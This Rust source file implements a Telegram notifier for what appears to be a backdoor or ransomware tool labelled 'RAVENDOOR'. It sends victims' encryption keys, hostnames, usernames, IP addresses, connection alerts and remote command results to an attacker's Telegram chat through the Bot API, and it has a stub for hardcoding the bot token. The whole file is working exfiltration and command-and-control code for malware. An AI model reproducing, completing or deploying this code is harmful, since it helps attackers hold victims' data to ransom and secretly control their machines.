use reqwest;
use serde::Serialize;
use std::error::Error;

#[derive(Serialize)]
struct TelegramMessage {
    chat_id: String,
    text: String,
    parse_mode: String,
}

pub struct TelegramBot {
    bot_token: String,
    chat_id: String,
    client: reqwest::Client,
}

impl TelegramBot {
    pub fn new(bot_token: &str, chat_id: &str) -> Self {
        Self {
            bot_token: bot_token.to_string(),
            chat_id: chat_id.to_string(),
            client: reqwest::Client::new(),
        }
    }
    
    pub async fn send_key(&self, key_hex: &str, hostname: &str, username: &str, ip: &str) -> Result<(), Box<dyn Error>> {
        let message = format!(
            "🔑 *NUEVA CLAVE RAVENDOOR*\n\n\
            🖥️ *Hostname:* `{}`\n\
            👤 *Usuario:* `{}`\n\
            🌐 *IP:* `{}`\n\
            🔐 *Clave:* `{}`",
            hostname, username, ip, key_hex
        );
        
        self.send_message(&message).await
    }
    
    pub async fn send_connection_notification(&self, hostname: &str, username: &str, ip: &str) -> Result<(), Box<dyn Error>> {
        use std::time::{SystemTime, UNIX_EPOCH};
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        
        let hours = (now / 3600) % 24;
        let minutes = (now / 60) % 60;
        let seconds = now % 60;
        let timestamp = format!("{:02}:{:02}:{:02}", hours, minutes, seconds);
        
        let message = format!(
            "✅ *CLIENTE CONECTADO*\n\n\
            🖥️ *Hostname:* `{}`\n\
            👤 *Usuario:* `{}`\n\
            🌐 *IP:* `{}`\n\
            ⏰ *Hora:* {}",
            hostname, username, ip, timestamp
        );
        
        self.send_message(&message).await
    }
    
    pub async fn send_command_execution(&self, client_id: &str, command: &str, result: &str) -> Result<(), Box<dyn Error>> {
        let truncated_result = if result.len() > 1000 {
            format!("{}...", &result[..1000])
        } else {
            result.to_string()
        };
        
        let message = format!(
            "⚡ *COMANDO EJECUTADO*\n\n\
            🆔 *Client ID:* `{}`\n\
            💻 *Comando:* `{}`\n\
            📋 *Resultado:*\n```\n{}\n```",
            client_id, command, truncated_result
        );
        
        self.send_message(&message).await
    }
    
    async fn send_message(&self, text: &str) -> Result<(), Box<dyn Error>> {
        let url = format!("https://api.telegram.org/bot{}/sendMessage", self.bot_token);
        
        let message = TelegramMessage {
            chat_id: self.chat_id.clone(),
            text: text.to_string(),
            parse_mode: "Markdown".to_string(),
        };
        
        let response = self.client
            .post(&url)
            .json(&message)
            .send()
            .await?;
        
        if response.status().is_success() {
            Ok(())
        } else {
            let error_text = response.text().await?;
            Err(format!("Telegram API error: {}", error_text).into())
        }
    }
}

// Función de utilidad para crear el bot desde variables de entorno
pub fn create_bot_from_env() -> Option<TelegramBot> {
    let bot_token = std::env::var("TELEGRAM_BOT_TOKEN").ok()?;
    let chat_id = std::env::var("TELEGRAM_CHAT_ID").ok()?;
    
    Some(TelegramBot::new(&bot_token, &chat_id))
}


pub fn create_bot_hardcoded() -> TelegramBot {
    TelegramBot::new(
        " ", // Tu token REAL
        " " // Tu chat ID REAL
    )

}
